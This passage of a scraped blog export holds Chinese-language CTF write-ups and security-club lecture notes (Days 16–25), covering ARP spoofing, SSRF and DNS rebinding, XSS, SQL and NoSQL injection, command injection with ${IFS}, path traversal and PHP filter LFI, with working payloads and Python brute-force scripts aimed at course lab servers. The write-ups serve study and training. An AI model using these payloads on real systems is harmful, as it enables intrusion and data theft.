()\n指令的標準輸出，當成前面的指令的參數\n\n例如 echo $(ls) 就是把 ls 的結果傳給\necho\n\ncut: 切割\n\n-d: 分隔符號\n-f: 第幾個\ncut -d \" \" -f 1 xxx: 以空格切割，取第一個\n\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day25","url":"/IThome_2024ironman_CTF_Day25/","content":"前言 \n本日進度：\n\n【成大資安社社課】淺談網路與\nH T T P - 完\n 2 題\nForensics\n\n\nWriteup \n第一題：Verify \n把每一個檔案都拿去 decrypt 一次，然後看有沒有正確的 hash 可以得到\nflag。\nfind ./files -type f -exec ./decrypt.sh {} \\; 2&gt;/dev/null | grep \"picoCTF\"\n第二題：Scan Surprise \nssh 連進去之後會有個跳出一個 QR code，掃出來就是 flag 了\n上課記錄 \n【成大資安社社課】淺談網路與\nH T T P\n什麼是協定 \n\n\nImage\n\nHTTP \n\nHTTP/2 之前的版本是一種建立在 TCP 上的傳輸協定。(HTTP/3\n例外，今天不提)\n為何需要使用 TCP 是因為網頁他會需要可靠性的傳輸。\n\n\n\nImage\n\nRequest \n\n\nImage\n\n路徑就是想要檔案的位置\nResponse \n\n\nImage\n\nstatus code:\n2 開頭成功，3 開頭重新導向，4 開頭客戶端錯誤，5 開頭伺服器錯誤\nHTTP Lab \n\n\nImage\n\n\n\nImage\n\nHTTP\nMethod\nDNS \n\n全名叫做 Domain Name System，是一種建立在 UDP 的協定。\n主要用來查詢 Domain Name 的 IP Address 或是查詢 IP Address 對應的 Domain\nName。\n那什麼是 Domain Name 呢？\n\n\n\nImage\n\n\n\nImage\n\nDNS Lab \n\n\nImage\n\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day24","url":"/IThome_2024ironman_CTF_Day24/","content":"前言 \n本日進度：\n\n【成大資安社社課】淺談網路與\nH T T P - 到 NAT\n\n\n淺談網路與 H T T P \n什麼是網路？ \n簡單來說就是把很多台電腦用網路線或是 WIFI\n串連在一起就是所謂的網路了\n可以比喻為一個送信的過程\n\n撰寫信件內容\n放進信封決定要掛號還是平信，還有寄給誰\n季見底止和收件地址\n把信給郵局，然後轉發到其他郵局再送到收件人手上（如果你要送的人就在你家隔壁，你就直接給他就好了）\n\n網路也是一樣的概念，假設要去瀏覽 Google 這個網站\n\nApplication layer (信件內容)\n\nTransport layer (信封)\n\nNetwork layer (寄件人和收件人)\n\n\nLink layer (郵局)\n\n\n什麼事 Mac Address \n\n\nImage\n\n跟 IP 的差異是 IP 是可以變動的， Mac Address\n是固定的，所以在區域網路裡面是檢查 Mac Address 的，而不是 IP Address\n在古代沒有 Switch 的時候， 適用 Hub 來連接多台電腦，但是 Hub\n是沒有腦袋的，他會把信送給所有人，每台電腦會檢查 Mac Address\n看那封信是不是寄給自己的，如果是就接收，如果不是就丟掉\n\n\nImage\n\n在有 Switch 後就只會把信送給對的人\n\n\nImage\n\n但在我們瀏覽網頁是用 IP Address 來找到對方的，要找到對方的 Mac\nAddress 就要用 ARP 協定\n\n\n會有一個 ARP Table 來記錄對方的 Mac\nAddress，固定一段時間後會清理和更新\n會不會有資安問題？\n會的，如果在我問目標的 Mac Address 時，有壞人騙我說他是目標的 Mac\nAddress，這樣就會把信送給壞人，這就是 ARP Spoofing\n\n\nImage\n\nLab - ARP Spoofing \nLab 關掉了不能玩 😥\n\n\nImage\n\nsudo tcpdump -Ai eth1\ntcpdump 去聽封包的內容， -A 是把封包的內容顯示出來，\n-i 是指定網卡\nsudo arpspoof -i eth1 -t 192.168.111.1 192.168.111.2\n這個指令就會幫你實作 ARP Spoofing 把 192.168.111.1\n要傳給 192.168.111.2 的封包攔截\n\n\nImage\n\n什麼是網路 - 網段 \n\n\nImage\n\n上下最不同的是，上面的送的人是區域網路，下面的是送給區域外的人，所以他是要經過\nRouter 來轉發的\n一樣用寄信來比喻\n\n\nImage\n\n\n\nImage\n\n上下最大的差異就是在區域內還是區域外，在網路內也是一樣的，要怎沒看是在區域內外等等會講\n\n\nImage\n\n\n\nImage\n\n可以通過判斷目標 IP 是否是寄給 Default Gateway\n來判斷是區域內還是區域外\n\n\nImage\n\n如何知道來源 IP 和目標 IP 是不是在同一個網段？\n\n\nImage\n\n把 Address 和 Netmask 的二進制做 AND 運算，就會是 Network ID\n，俗果兩個 Network ID 一樣就是在同一個網段 (所以如果 netmask 是\n255.255.255.0 的話其實就看 IP\n前九碼是不是都一樣就知道是不是在同區域，如果 netmask 是\n255.255.0.0 就看 IP 前六碼)\n/24 的意思 255.255.255.0 轉成二進制是\n11111111.11111111.11111111.00000000 ，因為有 24 個\n1，就表示成 /24\n什麼是網路 - 路由 \n資料送到 router 時， router 會根據上面的路由表傳送 packet\n，路由會根據他的路由地圖來決定要傳送給誰（就像我們可以利用 mtr\n看到我們資料是怎麼傳送目標的)\n\n\nImage\n\n上面這個就是路由表，如果是 192.168.20.5 就會通過 192.168.20.2\n出去\n\n\nImage\n\nrouter table 會以 netmask 最長的為優先\ndefault gateway 就是 0.0.0.0/0 的縮寫，那如果沒有\ndefault gateway 就會找不到路徑，就會出現\nDestination Host Unreachable\nTCP vs UDP \n\n\nImage\n\nUDP \n就是直接丟過去，不管有沒有真的收到\n\n\nImage\n\nTCP \n如果需要可靠信傳送，要是資料很大用 UDP 傳過去可能就會很破碎，TCP\n就會每次都確認有沒有收到，有收到後才會傳下一個\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n因為 TCP 的效能有點差，現在有一個叫做 QUIC 的協定，他是基於 UDP\n的，但是他有 TCP 的功能，所以效能會比較好\nPort \n因為一台電腦上有很多程式，所以要用 Port 來區分，每個服務都有自己的\nPort，像是 HTTP 預設是 80，HTTPS 是 443\nNAT \n現今 IPv4 最嚴重的問題，就是 IP 數量不夠用，因為 IP 最多就只有\n2^32 個，也就是 4,294,967,296 個，而且還有一些\nIP\n是不能用的，很明顯不可能讓地球上每個人都能用，這樣就會有些人沒有辦法用網路，所以就有兩個辦法\n\n換一個 IP 的協議: IPv6，但因為目前很多服務都是架在 IPv4\n上，大家也都還習慣用 IPv4，所以短期間就只能用下面那個方法\nNAT: 既然我們 IP 不夠用，那就讓一些電腦有 IP 就好，其他電腦用假的\nIP\n\n\nRouter 會有一個 NAT Table 來記錄每個請求的 Source IP 和 Destination\nIP，然後再把 Source IP 改成 Router 的\nIP，然後再把封包送出去，當對方回應時， Router 會根據 NAT Table\n把封包送到對應的電腦\n但這樣還有個問題，如果有個 Server 架在 NAT\n後面，外面就戳不到，解決的方法就是 Port Forwarding\n\n\n會把外面送進拉的 Port 轉換成對應的內部 IP\nHow does NAT work\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day23","url":"/IThome_2024ironman_CTF_Day23/","content":"前言 \n本日進度：\n\n【成大資安社社課】不是 web3.0 的\nweb3 - 完\n\n\n上課紀錄 \nSSRF (Server-Side Request\nForgery) \n\n伺服器端請求偽造 (Server-Side Request Forgery)\n繞過防火牆，存取內網設備\n多數資料庫、 mail server 等機敏設備會選擇架在內網\n\n先回看 url 的定義 rfc3986 \n\n\nImage\n\n\n\nImage\n\n對於 scheme 的利用\n\n本地\n\nphp 偽協議\n\n\ngopher \n\n\nImage\n\n但 gopher 這堂課不會詳細講道，之後再看\n檢查 authority 是否合法 \n目標: 成功存取內網的 ip 位置\n可能被阻擋的方法\n\n黑名單\n\n\n破解方法：\n\n\n\n利用 Domain 混淆\n\n\n白名單\n\n\n破解方法：\n利用 Open Redirect\n\nhttps://google.com/amp/moon-jam.me 就會自動轉址到\nmoon-jam.me\n\n\nDNS 解析後判斷是否合法\n\n\n破解方法：\n利用 DNS Rebinding\n\n製作 DNS Rebinding\n的網站\n上一秒的時候解析是 8.8.8.8 所以不會被擋掉\n\n但下一秒的時候解析就變成 127.0.0.1 了，就能成功存取內網\nip\n\norange 做的神奇東西，在不同服務解析出來的結果不一樣\n\n\n\nLab - ssrf 1 \n用之前介紹的方法，利用 http://0 會被當成\nhttp://localhost ，所以就可以成功存取內網 ip\n\n\nImage\n\nLab - ssrf 2 \n看他的程式碼知道網址的開頭要是 httpbin.dev ，去\nhttps://httpbin.dev 看看有什麼東西，發現了\n\n\nImage\n\n於是只要使用\nhttps://httpbin.dev/redirect-to?url=http://localhost/internal-only\n就可以成功存取內網 ip 拿盪 flag 了\nLab - ssrf 3 \n這提是用 DNS Rebinding\n的方式，但試了好幾次都沒成功，只好來寫個程式以量取勝\nimport requestsurl = \"http://chall.nckuctf.org:28123/mkreq?url=http%3A%2F%2F7f000001.c0a80001.rbndr.us%2Finternal-only\"while True:    response = requests.get(url)    print(response.text)    if \"NCKU\" in response.text:        print(response.text)        break\n然後跑一下下之後就拿到 flag 了\nFront-end Security \n除了 XSS 和 CSRF 之外，還有很多其他的酷東西\n\n\nImage\n\n\n網頁前端本身的限制，例如說不可能單純透過網頁讓你家的印表機列印東西，需要一個本地的伺服器，讓網頁去戳本地伺服器，再由本地伺服器去戳印表機\n\nSo\n\n\nImage\n\n\n\nImage\n\n這個 CVE 只要你點開一個網頁，你的小算盤就會跳出來\n\n\nImage\n\n或者是很多人用的 electron\n，背後其實也算是一個瀏覽器，也有可能被攻擊\nXSS \n\n\nImage\n\nSelf-XSS: 只能攻擊自己的 XSS\n，但可能可以透過其他攻擊手法造成更嚴重的影響\n\n\nImage\n\nBlind-XSS: XSS 在不知道甚麼時候可能會被觸發，例如當你把名字改成 XSS\npayload\n有個人把自己特斯拉的名字改成 XSS payload\n，有天車壞了拿去送修，結果剛好 XSS payload 被觸發，拿到 10000 USD 的 Bug\nBounty\n\n\nImage\n\n\n\nImage\n\n分類\n\nRelfected XSS (Non-persistent XSS)\n\n\n\nStored XSS (Persistent XSS)\n\nDOM-based XSS\n\n\n常見 payload\n\n\n\n\n常見 payload - javascript 偽協議\n\n\nImage\n\n避免 htmlescape\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n因為 javascript 偽協議可以不包含任何雙引號，所以就可以繞過\nhtmlescape\n常見 payload - innerHTML bitfall\n\n\n\n\n玩 XSS game~\nXSS worm \n\n\nImage\n\nTODO \n搞懂那 XSS Lab 怎麼拿到 Flag\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day22","url":"/IThome_2024ironman_CTF_Day22/","content":"前言 \n本日進度：\n\n7 題 web\n\n\nWriteup \n第一題：SQL Direct \n\n\nImage\n\n查了一下知道可以用 看看 table 的 schema，最後再用\nselect * from flags; 看看 table 的內容\n\n\nImage\n\n第二題：Irish-Name-Repo 1 \n簡單的 SQL Injection，用 ' OR 1=1; # -- 輸入就可以了\n\n\nImage\n\n第三題：Irish-Name-Repo 2 \n這題好像是會把 OR 過濾掉，所以試了一下之後只要用\nadmin'; -- # 就可以了\n\n\nImage\n\n第四題：Irish-Name-Repo 3 \n這題只有 password 可以輸入，試試看 ' OR 1=1; -- #\n發現不行，想不到其他方法就開個 Burp Suite 看一下，發現他後面會自帶一個\n&amp;debug=0 ，試試看改成 1 ，會發現他把 SQL query\n顯示出來了\n\n\nImage\n\n我發現他把 OR 變成 BE 了，似乎是\nrot13 ，所以我把 OR 改成 BE\n，就成功得到 flag 了\n\n\nImage\n\n第五題：Web Gauntlet \nround 1 \nfilter: or\npayload: admin'; -- #\nround 2 \nfilter: or, and, like,\n=, --\npayload: admin'; #\nround 3 \nfilter: or, and, =,\nlike, &gt;, &lt;,\n--\n但試了好久才她好像還擋了空白 OwO\npayload: admin';#\nround 4 \nfilter: or, and, =,\nlike, &gt;, &lt;,\n--, admin\n查了一下發現 || 可以把兩個字串連接起來，所以把\nadmin' 改成 ad'||'min' 就可以了\npayload: ad'||'min';#\nround 5 \nfilter: or, and, =,\nlike, &gt;, &lt;,\n--, union, admin\npayload: ad'||'min';#\n然後到 filter.php 就可以看到 flag 了\n\n\nImage\n\n第六題：Web Gauntlet 2 \nfilter:\nor and true false union like = &gt; &lt; ; -- /* */ admin\n試了才發現好像 #\n根本沒有起到註解的用途，前面好像是放辛酸的，只好修改 password 使得 query\n成立，所以就把 password 設為 a' is not 'b 就可以了\npayload: username ad'||'min, password\na' is not 'b\n\n\nImage\n\n第七題：Web Gauntlet 3 \n這題好像跟上一題一模一樣? 就把上提的 payload 照抄就過了\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day21","url":"/IThome_2024ironman_CTF_Day21/","content":"前言 \n本日進度：\n\n【成大資安社社課】不是 web3.0 的\nweb3 - 到 SSRF\n\n\n上課紀錄 \nNoSQL Injection \nNoSQL = Not Only SQL\n比較一下\n\n\nImage\n\nNoSQL 的特點: 不用提前定義 schema ，結構較靈活 ，更多的優點可以看 這裡\n名詞上的定義比較\n\n\nImage\n\n範例\n\n\nImage\n\n\n\nImage\n\nNo SQL Injection 的精隨\n\n\nImage\n\n像是利用 $ne 表示不相等，因為 xxx\n跟真正的密碼不一樣，所以就會通關\n\n\nImage\n\n如果只回傳結果，不把細節跟你講，這樣就算成功登入，也不能知道真正的密碼\n\n\nImage\n\n可以用 regular expression 來迭代嘗試出結果，就跟我上次寫的\ndig blind 道理一樣\n\n\nImage\n\nLab - no-sql-injection \nLab 伺服器好像掛了 qaq ，之後再試\nLab - no-sql-injection-blind \n好像也掛了 qaq ，之後再試\nSSRF (Server-Side Request\nForgery) \n\n伺服器端請求偽造 (Server-Side Request Forgery)\n繞過防火牆，存取內網設備\n多數資料庫、 mail server 等機敏設備會選擇架在內網\n\n先回看 url 的定義 rfc3986 \n\n\nImage\n\n\n\nImage\n\n對於 scheme 的利用\n\n本地\n\nphp 偽協議\n\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day20","url":"/IThome_2024ironman_CTF_Day20/","content":"前言 \n本日進度：\n\n【成大資安社社課】WEB\n2 - Lab\n\n\n上課紀錄 \nLab - swirl \nstage 1 &amp; 2 \n這兩題跟之前 Lab - phpisbest 差不多，只要在後面加上\n/?A[]=[0]&amp;B[]=[3] 就能達成各種 null==null\n就能過關了\nstage 3 \n這題我有觀察到可以 path\ntraversal，但是我亂戳戳不到東西，過了大概十分鐘，又沒忍住點了一下 hint\n，才發現要戳的東西就是寫在原始碼裡面的 config.php\n，就能前往下一關了\n\n\nImage\n\n\n\nImage\n\nstage 4 \n這題她沒有一個地方讀取 👀 ，但有個\nextract($_POST) 可以利用 POST 的方式輸入\n👀 ，之後就跟 lfi2rce 一樣，利用 php\nfilter chain 構造出 webshell ，就能得到 Flag 了\n\n\nImage\n\n\n\nImage\n\nNote: 這邊要注意的是這個 webshell 指令最後需要的參數\n1，他是透過 $_GET[1]\n來取得的，所以要寫在網址後面解析，不是寫在 POST 裡面\nLab - fakelog \n他很好心的給我們看了他生成的原始碼\n#!/usr/local/bin/python3import sysif __name__ == '__main__':    if len(sys.argv) &lt; 2:        print(\"no argument\")        sys.exit()    magic_num = int(sys.argv[1]) if sys.argv[1].isdigit() else sys.argv[1]    if magic_num == 0:        print(\"0 is not allowed\")        sys.exit()    while magic_num != 1:        with open(f\"fakelog/{magic_num % 6 if isinstance(magic_num, int) else magic_num}\", \"r\", encoding=\"utf-8\") as fd:            print(fd.read())        magic_num = 3 * magic_num + 1 if magic_num % 2 else magic_num // 2\n重點有兩個\n\nmagic_num = int(sys.argv[1]) if sys.argv[1].isdigit() else sys.argv[1]\nwith open(f\"fakelog/{magic_num % 6 if isinstance(magic_num, int) else magic_num}\", \"r\", encoding=\"utf-8\") as fd:\n\n他不會檢查 magic number\n是文字，而且在他是文字的時候他還會直接讓我們讀取檔案，所以我們可以利用這個漏洞來做\npath traversal\n又可以從 Hint 的 dockerfile 中知道有個叫 main.py\n是主程式，拿出來看看\nFROM python:3.10RUN curl -sSL https://install.python-poetry.org | POETRY_HOME=/etc/poetry python3 - WORKDIR /appCOPY pyproject.toml poetry.lock .RUN /etc/poetry/bin/poetry config virtualenvs.create false &amp;&amp; \\    /etc/poetry/bin/poetry installCOPY . .ARG FLAGRUN echo $FLAG &gt; /app/flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1`USER daemon ENTRYPOINT [\"python\", \"/app/main.py\"]\n\n\nImage\n\nresult:from flask import Flask, render_template, request, send_fileimport subprocessapp = Flask(__name__)@app.route('/')def home():return render_template('home.html')@app.route('/howtogen')def howtogen():return send_file('gen.py', mimetype='text/plain', as_attachment=False)@app.route('/hint')def hint():return send_file('Dockerfile', mimetype='text/plain', as_attachment=False)@app.route('/gen', methods=['GET', 'POST'])def get_input():message = Noneif request.method == 'POST':user_input = request.form['user_input']if \" \" in user_input:result = \"evil input\"else:result = subprocess.run(f\"python gen.py {user_input}\", shell=True, capture_output=True, text=True).stdout.replace('\\', '')message = f\"result: {result}\"return render_template('generate.html', message=message)if __name__ == \"__main__\":app.run(host='0.0.0.0', port=5050)\n可以知道不能輸入空白，另外還有他執行程式的方法是\nsubprocess.run(f\"python gen.py {user_input}\", shell=True, capture_output=True, text=True).stdout.replace('\\', '')\n可以讓我們利用類似 ;id 這樣的方式來達到 RCE，空白就用\n${IFS} 來代替，隨便戳戳看之後就能拿到 Flag 了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day19","url":"/IThome_2024ironman_CTF_Day19/","content":"前言 \n本日進度：\n\n【成大資安社社課】WEB\n2 - Lab\n\n\nLab-login \n題目很好心把他會查詢的指令列出來了，可以發現他都有用 ()\n包起來，所以截斷的時候要注意要把 ) 也帶上，就能順利\nInjection 了。\n\n\nImage\n\n\n\nImage\n\nDig Arguments \n他有提供網站的原始碼，是用 flask 建的，下面這個是主要邏輯\n@app.route(\"/\", methods=[\"GET\", \"POST\"])def dig():    dig_result = None    if request.args.get(\"debug\"):        return send_file(__name__ + \".py\")    if request.method == \"POST\":        hostname1 = request.form[\"hostname1\"]        hostname2 = request.form[\"hostname2\"]        process = subprocess.Popen(            [\"dig\", hostname1, hostname2],            stdout=subprocess.PIPE,            stderr=subprocess.PIPE,        )        output, _ = process.communicate()        dig_result = output.decode()    return render_template(\"index.html\", request=request, dig_result=dig_result)\n[\"dig\", hostname1, hostname2] 這樣的寫法會讓我們打算\ninjection\n講師給了一個 酷酷網站\n，可以查到很多利用一些本來應該不是用來讀檔或執行指令的\n的指令來 bypass 的方法，就找到了這個東東，按照這個方法就可以讀到 flag\n了。\n\n\nImage\n\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day18","url":"/IThome_2024ironman_CTF_Day18/","content":"前言 \n本日進度：\n\n【成大資安社社課】WEB\n2 - lab\n\n\n上課紀錄 \nLab - dig-blind \n他只會回傳 success 和 fail，先試試看\n'; grep -q \"NCKUCTF{d19_\" /fl* &amp;&amp; exit 0 || exit 1'\n，好欸，他回傳 success !!!!\n但每一位都用人工猜有點太慢，可以寫個程式根據他回傳的 0 1 訊號反推\nflag ，最笨的方法就是直接一個個慢慢枚舉，這樣複雜度會是 O (NK) ， N\n是字串長度，K 是枚舉的字元集數量，根據之前的觀察字元集應該是\n0123456789abcdefghijklmnopqrstuvwxyz_!{}\n，雖然我想到比較好的方法是把每個字轉 ASCII\n，再用二進位表示，這樣就只會最多 7 次就知道那一個字是啥了，能壓到\nO (N)，但這樣寫有點累，而且字元集也不算太多，要是真的不行就再拿多執行緒來用也可以變成\nO (N)\n我的 python 程式碼：\nimport requestsurl = \"http://140.116.246.59:28116/\"prefix = \"NCKUCTF{d19_\"  charset = \"0123456789abcdefghijklmnopqrstuvwxyz_!}\"  flag = prefixwhile not flag.endswith(\"}\"):    for char in charset:        payload = f\"'; grep -q \\\"{flag + char}\\\" /fl* &amp;&amp; exit 0 || exit 1'\"        data = {'name': payload}                response = requests.post(url, data=data)                if response.text.count(\"success\") == 2:            flag += char            print(f\"Found: {flag}\")            breakprint(f\"Final Flag: {flag}\")\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day17","url":"/IThome_2024ironman_CTF_Day17/","content":"前言 \n本日進度：\n\n【成大資安社社課】WEB\n2 - 完\n\n\n上課紀錄 \nInjection (駭客的填字遊戲) \n\n\nImage\n\n把所有車牌都刪掉了 xddd\n\n\nImage\n\n讚讚的影片說明\n這次會提到的\n\n\nImage\n\nCode Injection \n以 python eval 舉例\n\n\nImage\n\n其他常見的危險函式\n\n\nImage\n\n如何預防?\n可以看看 這個\nCode Injection 常常會出現在 IOT 設備 (像是監視器、TX link 之類的)\nCommand Injection \n\n\nImage\n\n指令就會變成 dig vincent55.tw; id\n基本技巧 ; | &amp;&amp;\n||\n\n\nImage\n\ncommand substitution\n\n\nImage\n\n如果空白被過濾了 - 用 ${IFS} / &lt;\n\n\nImage\n\n如果有一些 keyword 被過濾了\n\n\nImage\n\nLab - dig \n這題她有提供原始碼，可以知道背後的執行邏輯是\n&lt;pre&gt;&lt;?= system(\"dig '\" . $_POST['name'] . \"';\") ?&gt;&lt;/pre&gt;\n，所以可以用 '; 來截斷 dig\n然後就能在後面輸入想要的指令了，先用 ls 找到 Flag\n的位置，然後再印出來就是答案摟\n\n\nImage\n\n\n\nImage\n\nLab - dig waf1 \n這題多檔了一些字\nblacklist = ['|', '&amp;', ';', '&gt;', '&lt;', \"\\n\", 'flag'];\n，可以用之前的 code substitution 來繞過\n\n\nImage\n\nLab - dig waf2 \n這題多檔了空白，用 ${IFS} 就能通過了\n\n\nImage\n\nReverse shell \nNormal shell: ssh\n\n\nImage\n\nReverse shell 就是改成從 server 主動連線到 client\n\n\nImage\n\n\n\nImage\n\n這邊 有各種不同的 reverse\nshell\nngrok\n可以用來反向代理，這樣如果連成大網路就不會被擋一些東西了\nSQL Injection \n簡介\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\nSELECT title, subtitle, context FROM articles;\n這邊是要找出 title, subtitle, context 這三個欄位的資料\n\n\nImage\n\nSELECT * FROM articles;\n找出所有欄位的資料\n\n\nImage\n\nSELECT * FROM articles WHERE id = 2;\n找出 id 為 2 的資料\n\n\nImage\n\n這邊就有點像是前面 command injection\n一樣，可以讓他做一些壞壞的事情\nSELECT * FROM articles WHERE id = 3; DROP TABLE articles;\n\n\nImage\n\n另外如果是在處理登入的資料庫是用\nSELECT * FROM user='' AND pass=\n來做判斷帳密是否正確，那就有可能發生下面一張的問題\n\n\nImage\n\n藉由 ' 截斷 和 --\n註解的方式，可以讓他不管密碼是什麼的狀況下登入\n\n\nImage\n\n分類\n\nStacked: 用分號隔開各種語句\nUnion Based: 用 UNION 來將兩個語句合在一起\nBlind Based: 當目標不會告訴你 result 的時候\n\nTime Based: 透過 sleep 來判斷條件\nBoolean Based: 透過布林結果來判斷條件\n\nError Based: 透過錯誤訊息來取得資料\nOut of Band: 讀檔、寫檔…\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day16","url":"/IThome_2024ironman_CTF_Day16/","content":"前言 \n本日進度：\n\n【成大資安社社課】WEB\n2 - LFI\n\n\n上課紀錄 \nPath Traversal \nIntro \n\n\nImage\n\n像是類似這樣的網址，如果把 ?file=report.pdf 改成\n?file=../../../../etc/passwd 就有可能得到一些機密資料\nHow to Happen \n\n\nImage\n\n常用來被攻擊的路徑 \n\n\nImage\n\n其他可以參考 這邊\n防禦方式 \n\n強制加上副檔名\n\n(可以在後面加上 Null Byte %00 來繞過，但在 php5.4\n已經被修掉了)\n確認路徑前綴\n\n\nLab - Pathwalker \n到網頁之後她會很好心的告訴你 Flag 的位置，然後你可以用 Path Traversal\n的方式去找到 Flag 了\n\n\nImage\n\n\n\nImage\n\nLab - Pathwalker - waf \n這題有塞了一個正則表達式的 WAF /^apple|banana|cappo$/\n但其實是有漏洞的，他只要符合\n\napple 開頭\n包含 banana\n結尾是 cappo\n\n其中一個就算符合 (正確應該是 ^(apple|banana|cappo)$)\n，所以就能很輕鬆地繞過了\n\n\nImage\n\nLFI (Local File Inclusion) \n\n\nImage\n\n用 include 表示他會自動把檔案 parse ，假設 include 的是 php 就會自動\nparse 成 php 的東西 (如果本來某個路徑的東西是不能拿的，就可能可以用 LFI\n拿到，就像下面這樣)\n\n\nImage\n\nparse 之後有可能會讓一些東西不見，就像是註解的內容，這時候可以用 php\n偽協議把內容轉成 base64 ，然後再解碼就可以看到原本的內容了\n\n\nImage\n\n\n\nImage\n\n格式:\nphp://filter/{read= / write= / &lt;empty&gt;(自己決定要讀檔還寫檔)}convertor}/resource=&lt;file_path&gt;\nconvertor: string.rot13, convert.base64-encode,\nconvert.base64-decode, zlib.delate… 參見 這邊\n如果有多個 convertor ，就用 | 來串起來\n\n\nImage\n\nLab - lfi \n將 flag.php 用 base64 列印\n(?page=php://filter/convert.base64-encode/resource=flag)\n出來之後再解密就能得到 Flag 了\n\n\nImage\n\nLab - lfi2rce \n這題要取得在根目錄的 Flag ，直接偷 